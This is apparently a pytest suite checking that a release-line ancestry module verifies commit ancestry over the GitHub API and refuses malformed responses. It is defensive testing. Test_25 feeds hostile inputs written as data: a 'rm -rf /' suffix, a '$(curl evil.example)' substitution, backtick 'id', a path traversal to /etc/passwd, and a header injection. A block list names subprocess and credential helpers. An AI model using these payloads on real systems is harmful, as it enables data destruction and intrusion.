"""Release-line ancestry must be proven, not assumed, and must fail closed on every API defect.

Run 30578134633 failed because ancestry was proven with `git fetch` inside a checkout created with
`persist-credentials: false`. The fix proves ancestry over the REST API with the job token held in
memory, leaving the checkout credential-free. These tests drive the module with mocked responses so
every refusal path is exercised without touching the network.
"""

from __future__ import annotations

import io
import json
import re
import urllib.error
from pathlib import Path

import pytest

import release_line_policy as rl

CANDIDATE = "50cbe173ea55fea6943c40765ab64dde99406c2e"
HEAD = "50cbe173ea55fea6943c40765ab64dde99406c2e"
OTHER = "a" * 40
TOKEN = "test-token-value-not-real"


class _Response(io.BytesIO):
    def __init__(self, payload, status=200):
        body = payload if isinstance(payload, (bytes, bytearray)) else json.dumps(payload).encode()
        super().__init__(body)
        self.status = status

    def getcode(self):
        return self.status

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.close()
        return False


def _branch(name=rl.EXPECTED_RELEASE_BRANCH, sha=HEAD):
    return {"name": name, "commit": {"sha": sha},
            "_links": {"html": f"https://github.com/{rl.EXPECTED_REPOSITORY}/tree/{name}"}}


def _commit(sha=CANDIDATE):
    return {"sha": sha}


def _compare(status="identical", base=CANDIDATE, merge_base=CANDIDATE, drop=()):
    payload = {"status": status, "base_commit": {"sha": base}, "merge_base_commit": {"sha": merge_base}}
    for key in drop:
        payload.pop(key, None)
    return payload


def make_opener(branch=None, commit=None, compare=None, *, raises=None, captured=None):
    """Route by URL so each endpoint can be manipulated independently."""
    def opener(request, timeout=None):
        url = request.full_url
        if captured is not None:
            captured.append({"url": url, "headers": dict(request.headers)})
        if raises is not None:
            raise raises
        if "/branches/" in url:
            return _Response(_branch() if branch is None else branch)
        if "/compare/" in url:
            return _Response(_compare() if compare is None else compare)
        if "/commits/" in url:
            return _Response(_commit() if commit is None else commit)
        raise AssertionError(f"unexpected URL {url}")
    return opener


# ---------------------------------------------------------------- 17 / 18 success paths


def test_identical_status_succeeds():
    """(17) The candidate IS the branch head."""
    proof = rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener())
    assert proof.status == "identical"
    assert proof.merge_base_sha == CANDIDATE
    assert proof.candidate_sha == CANDIDATE
    assert proof.repository == "VANTA2026/ASCEND-OS"
    assert proof.branch == "release/build-616-backend-d1f4"


def test_ahead_status_succeeds():
    """(18) The branch contains the candidate plus later commits."""
    later = "b" * 40
    proof = rl.prove_release_line_ancestry(
        CANDIDATE, TOKEN,
        opener=make_opener(branch=_branch(sha=later), compare=_compare(status="ahead")),
    )
    assert proof.status == "ahead"
    assert proof.branch_head_sha == later
    assert proof.merge_base_sha == CANDIDATE


def test_success_record_names_every_measured_value():
    rendered = rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener()).render()
    for fragment in ("repository=", "branch=", "candidate=", "branch_head=", "merge_base=", "status="):
        assert fragment in rendered
    assert CANDIDATE in rendered


# ---------------------------------------------------------------- 1-6 transport failures


def test_1_absent_token_refuses():
    with pytest.raises(rl.AncestryError, match="no API token"):
        rl.prove_release_line_ancestry(CANDIDATE, "", opener=make_opener())


@pytest.mark.parametrize("code", [401, 403, 404, 500])
def test_2_3_4_http_errors_refuse(code):
    err = urllib.error.HTTPError("https://api.github.com/x", code, "err", {}, None)
    with pytest.raises(rl.AncestryError, match=f"HTTP {code}"):
        rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener(raises=err))


def test_5_timeout_refuses():
    with pytest.raises(rl.AncestryError):
        rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener(raises=TimeoutError()))


def test_5b_url_error_refuses():
    with pytest.raises(rl.AncestryError):
        rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener(raises=urllib.error.URLError("dns")))


def test_6_malformed_json_refuses():
    def opener(request, timeout=None):
        return _Response(b"{not json")
    with pytest.raises(rl.AncestryError, match="malformed JSON"):
        rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=opener)


def test_6b_non_object_json_refuses():
    def opener(request, timeout=None):
        return _Response(b"[1,2,3]")
    with pytest.raises(rl.AncestryError, match="expected an object"):
        rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=opener)


# ---------------------------------------------------------------- 7-9 identity of the response


def test_7_wrong_repository_in_response_refuses():
    bad = _branch()
    bad["_links"]["html"] = "https://github.com/attacker/evil/tree/x"
    with pytest.raises(rl.AncestryError, match="does not belong to"):
        rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener(branch=bad))


def test_8_wrong_branch_in_response_refuses():
    with pytest.raises(rl.AncestryError, match="expected 'release/build-616-backend-d1f4'"):
        rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener(branch=_branch(name="main")))


@pytest.mark.parametrize("bad_sha", ["", "50cbe17", "ZZZZ" + "a" * 36, "50CBE173EA55FEA6943C40765AB64DDE99406C2E"])
def test_9_malformed_branch_head_refuses(bad_sha):
    payload = _branch(sha=bad_sha)
    with pytest.raises(rl.AncestryError):
        rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener(branch=payload))


def test_9b_missing_commit_object_refuses():
    payload = {"name": rl.EXPECTED_RELEASE_BRANCH}
    with pytest.raises(rl.AncestryError, match="no commit sha"):
        rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener(branch=payload))


# ---------------------------------------------------------------- 10 candidate existence


def test_10_commit_endpoint_returning_a_different_sha_refuses():
    with pytest.raises(rl.AncestryError, match="commit endpoint returned sha"):
        rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener(commit=_commit(sha=OTHER)))


def test_10b_abbreviated_sha_from_commit_endpoint_refuses():
    with pytest.raises(rl.AncestryError, match="commit endpoint returned sha"):
        rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener(commit=_commit(sha=CANDIDATE[:7])))


# ---------------------------------------------------------------- 11-16 compare semantics


@pytest.mark.parametrize("status", ["behind", "diverged"])
def test_11_12_behind_and_diverged_refuse(status):
    with pytest.raises(rl.AncestryError, match="compare status"):
        rl.prove_release_line_ancestry(
            CANDIDATE, TOKEN, opener=make_opener(compare=_compare(status=status)))


def test_13_missing_status_refuses():
    with pytest.raises(rl.AncestryError, match="no status field"):
        rl.prove_release_line_ancestry(
            CANDIDATE, TOKEN, opener=make_opener(compare=_compare(drop=("status",))))


def test_14_missing_merge_base_refuses():
    with pytest.raises(rl.AncestryError, match="no merge_base_commit"):
        rl.prove_release_line_ancestry(
            CANDIDATE, TOKEN, opener=make_opener(compare=_compare(drop=("merge_base_commit",))))


def test_15_merge_base_differing_from_the_candidate_refuses():
    with pytest.raises(rl.AncestryError, match="NOT an ancestor"):
        rl.prove_release_line_ancestry(
            CANDIDATE, TOKEN, opener=make_opener(compare=_compare(merge_base=OTHER)))


def test_16_base_commit_differing_from_the_candidate_refuses():
    with pytest.raises(rl.AncestryError, match="base_commit is"):
        rl.prove_release_line_ancestry(
            CANDIDATE, TOKEN, opener=make_opener(compare=_compare(base=OTHER)))


def test_19_shared_tree_content_without_ancestry_refuses():
    """(19) A commit with an identical tree but a different history is NOT contained."""
    twin = "c" * 40
    compare = _compare(status="diverged", base=CANDIDATE, merge_base=twin)
    with pytest.raises(rl.AncestryError, match="NOT an ancestor"):
        rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener(compare=compare))


def test_compare_http_success_alone_is_not_sufficient():
    """A 200 with an unusable body must still refuse."""
    with pytest.raises(rl.AncestryError):
        rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener(compare={}))


# ---------------------------------------------------------------- 20 / 23 / 24 / 25 hardening


def test_20_token_is_only_ever_a_header_and_is_never_in_the_url():
    captured = []
    rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener(captured=captured))
    assert captured, "no requests were made"
    for call in captured:
        assert TOKEN not in call["url"], "token must never appear in a URL"
        auth = call["headers"].get("Authorization", "")
        assert auth.startswith("Bearer "), "token must be sent as a Bearer header"


def test_20b_the_module_never_prints_or_persists_the_token():
    source = Path(rl.__file__).read_text()
    assert "print(token" not in source
    assert re.search(r"open\([^)]*['\"]w", source) is None, "the module must not write files"
    for forbidden in ("subprocess", "os.system", "credential.helper", "extraheader"):
        assert forbidden not in source, f"{forbidden} must not appear in the ancestry module"


def test_23_repository_and_branch_are_fixed_constants():
    assert rl.EXPECTED_REPOSITORY == "VANTA2026/ASCEND-OS"
    assert rl.EXPECTED_RELEASE_BRANCH == "release/build-616-backend-d1f4"
    import inspect

    signature = inspect.signature(rl.prove_release_line_ancestry)
    assert set(signature.parameters) == {"candidate_sha", "token", "opener"}, (
        "repository and branch must not be parameters"
    )


def test_24_a_caller_cannot_redirect_the_api_request():
    captured = []
    rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener(captured=captured))
    for call in captured:
        assert call["url"].startswith("https://api.github.com/repos/VANTA2026/ASCEND-OS/"), call["url"]


@pytest.mark.parametrize("payload", [
    "50cbe173ea55fea6943c40765ab64dde99406c2e; rm -rf /",
    "$(curl evil.example)",
    "`id`",
    "../../../../etc/passwd",
    "a" * 40 + "\nInjected: 1",
    "50cbe173ea55fea6943c40765ab64dde99406c2e ",
])
def test_25_shell_metacharacters_cannot_alter_the_request(payload):
    with pytest.raises(rl.AncestryError, match="40 lowercase hex"):
        rl.prove_release_line_ancestry(payload, TOKEN, opener=make_opener())


def test_branch_name_with_a_slash_is_url_encoded():
    captured = []
    rl.prove_release_line_ancestry(CANDIDATE, TOKEN, opener=make_opener(captured=captured))
    branch_calls = [c for c in captured if "/branches/" in c["url"]]
    assert branch_calls, "the branch endpoint must be called"
    assert "release%2Fbuild-616-backend-d1f4" in branch_calls[0]["url"], branch_calls[0]["url"]
